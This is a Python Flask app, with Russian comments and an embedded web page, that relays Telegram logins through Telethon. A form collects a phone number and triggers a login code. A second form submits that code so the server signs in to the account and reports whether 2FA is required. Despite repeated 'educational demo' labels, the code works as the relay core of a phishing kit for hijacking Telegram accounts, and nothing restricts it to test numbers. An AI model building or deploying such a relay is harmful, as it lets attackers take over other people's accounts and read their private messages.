import os
import asyncio
import logging
from flask import Flask, request, jsonify
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PhoneNumberInvalidError, 
    PhoneCodeExpiredError
)

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

class TelegramAuthTester:
    def __init__(self):
        try:
            self.api_id = int(os.getenv('TELEGRAM_API_ID', ''))
            self.api_hash = os.getenv('TELEGRAM_API_HASH', '')
            self.initialized = bool(self.api_id and self.api_hash)
            logger.info("✅ Тестер аутентификации инициализирован")
        except (ValueError, TypeError):
            logger.error("❌ Неверные API ключи")
            self.initialized = False
        
    async def test_auth_flow(self, phone_number):
        """Тестируем поток аутентификации (для образовательных целей)"""
        if not self.initialized:
            return {
                'success': False, 
                'error': 'Проверьте API ключи'
            }
            
        try:
            logger.info(f"🔐 Тестирование аутентификации для: {phone_number}")
            
            # Создаем временный клиент
            client = TelegramClient(
                StringSession(),
                self.api_id,
                self.api_hash
            )
            
            await client.connect()
            
            # ИСПРАВЛЕННАЯ ЧАСТЬ - используем правильный метод
            sent_code = await client.send_code_request(phone_number)
            
            logger.info(f"📱 Код запрошен для {phone_number}")
            
            return {
                'success': True,
                'message': 'Код аутентификации запрошен',
                'phone_code_hash': sent_code.phone_code_hash,
                'is_test': True
            }
            
        except PhoneNumberInvalidError:
            logger.error(f"❌ Неверный номер: {phone_number}")
            return {'success': False, 'error': 'Неверный номер телефона'}
        except Exception as e:
            logger.error(f"❌ Ошибка тестирования: {e}")
            return {'success': False, 'error': f'Ошибка: {str(e)}'}

    async def verify_code_test(self, phone_number, code, phone_code_hash):
        """Тестируем верификацию кода"""
        if not self.initialized:
            return {'success': False, 'error': 'Система не инициализирована'}
            
        try:
            client = TelegramClient(
                StringSession(),
                self.api_id,
                self.api_hash
            )
            
            await client.connect()
            
            # Пытаемся войти с кодом (образовательная цель)
            try:
                await client.sign_in(
                    phone_number=phone_number,
                    code=code,
                    phone_code_hash=phone_code_hash
                )
                
                logger.info("✅ Тест: Код верификации успешен")
                return {
                    'success': True,
                    'message': 'Тест пройден - код корректен',
                    'is_test': True
                }
                
            except SessionPasswordNeededError:
                logger.info("🔒 Тест: Требуется 2FA пароль")
                return {
                    'success': True,
                    'message': 'Тест: требуется пароль 2FA',
                    'needs_password': True,
                    'is_test': True
                }
                
            except PhoneCodeInvalidError:
                logger.warning("⚠️ Тест: Неверный код")
                return {'success': False, 'error': 'Тест: неверный код'}
                
        except Exception as e:
            logger.error(f"❌ Ошибка тестирования: {e}")
            return {'success': False, 'error': str(e)}

# Инициализация
auth_tester = TelegramAuthTester()

def run_async(coro):
    """Запуск асинхронных функций"""
    return asyncio.run(coro)

# 🎯 Образовательные маршруты
@app.route('/')
def educational_demo():
    return '''
<!DOCTYPE html>
<html>
<head>
    <title>Educational Auth Demo</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .container { max-width: 500px; margin: 0 auto; }
        .input { width: 100%; padding: 10px; margin: 5px 0; }
        .btn { background: #007bff; color: white; padding: 10px 20px; border: none; cursor: pointer; }
        .alert { padding: 10px; margin: 10px 0; border-radius: 5px; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        .info { background: #d1ecf1; color: #0c5460; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Educational Auth Demo</h1>
        <p>Демонстрация механизмов аутентификации (ТОЛЬКО ДЛЯ ОБРАЗОВАНИЯ)</p>
        
        <div class="alert info">
            ⚠️ Это образовательная демонстрация. Не используйте реальные данные!
        </div>
        
        <div id="step1">
            <h3>Тест запроса кода</h3>
            <input type="text" id="phone" class="input" placeholder="Тестовый номер" value="+1234567890">
            <button class="btn" onclick="testCodeRequest()">Тест запроса кода</button>
        </div>
        
        <div id="step2" style="display:none;">
            <h3>Тест верификации кода</h3>
            <input type="text" id="code" class="input" placeholder="Тестовый код" value="12345">
            <button class="btn" onclick="testCodeVerify()">Тест верификации</button>
        </div>
        
        <div id="results"></div>
    </div>

    <script>
        let currentPhone = '';
        let currentCodeHash = '';

        function showAlert(message, type) {
            const results = document.getElementById('results');
            results.innerHTML = `<div class="alert ${type}">${message}</div>`;
        }

        async function testCodeRequest() {
            const phone = document.getElementById('phone').value;
            currentPhone = phone;

            const response = await fetch('/api/educational/test-request', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phone})
            });
            
            const data = await response.json();
            
            if (data.success) {
                currentCodeHash = data.phone_code_hash;
                document.getElementById('step2').style.display = 'block';
                showAlert('✅ Тест: код запрошен успешно', 'success');
            } else {
                showAlert('❌ ' + data.error, 'error');
            }
        }

        async function testCodeVerify() {
            const code = document.getElementById('code').value;

            const response = await fetch('/api/educational/test-verify', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    phone: currentPhone,
                    code: code,
                    phone_code_hash: currentCodeHash
                })
            });
            
            const data = await response.json();
            
            if (data.success) {
                showAlert('✅ ' + data.message, 'success');
            } else {
                showAlert('❌ ' + data.error, 'error');
            }
        }
    </script>
</body>
</html>
'''

@app.route('/api/educational/test-request', methods=['POST'])
def test_code_request():
    """Образовательный endpoint для тестирования запроса кода"""
    data = request.get_json()
    phone = data.get('phone', '').strip()
    
    if not phone:
        return jsonify({'success': False, 'error': 'Введите номер для теста'})
    
    result = run_async(auth_tester.test_auth_flow(phone))
    return jsonify(result)

@app.route('/api/educational/test-verify', methods=['POST'])
def test_code_verify():
    """Образовательный endpoint для тестирования верификации кода"""
    data = request.get_json()
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    phone_code_hash = data.get('phone_code_hash', '')
    
    if not all([phone, code, phone_code_hash]):
        return jsonify({'success': False, 'error': 'Недостаточно данных для теста'})
    
    result = run_async(auth_tester.verify_code_test(phone, code, phone_code_hash))
    return jsonify(result)

@app.route('/educational-info')
def educational_info():
    """Образовательная информация о механизмах аутентификации"""
    return jsonify({
        'purpose': 'Образовательная демонстрация механизмов аутентификации',
        'features': [
            'Демонстрация запроса кода верификации',
            'Тестирование процесса верификации', 
            'Анализ ошибок аутентификации',
            'Изучение работы Telegram API'
        ],
        'warning': 'НЕ ИСПОЛЬЗУЙТЕ РЕАЛЬНЫЕ ДАННЫЕ!',
        'educational_value': 'Понимание механизмов безопасности'
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
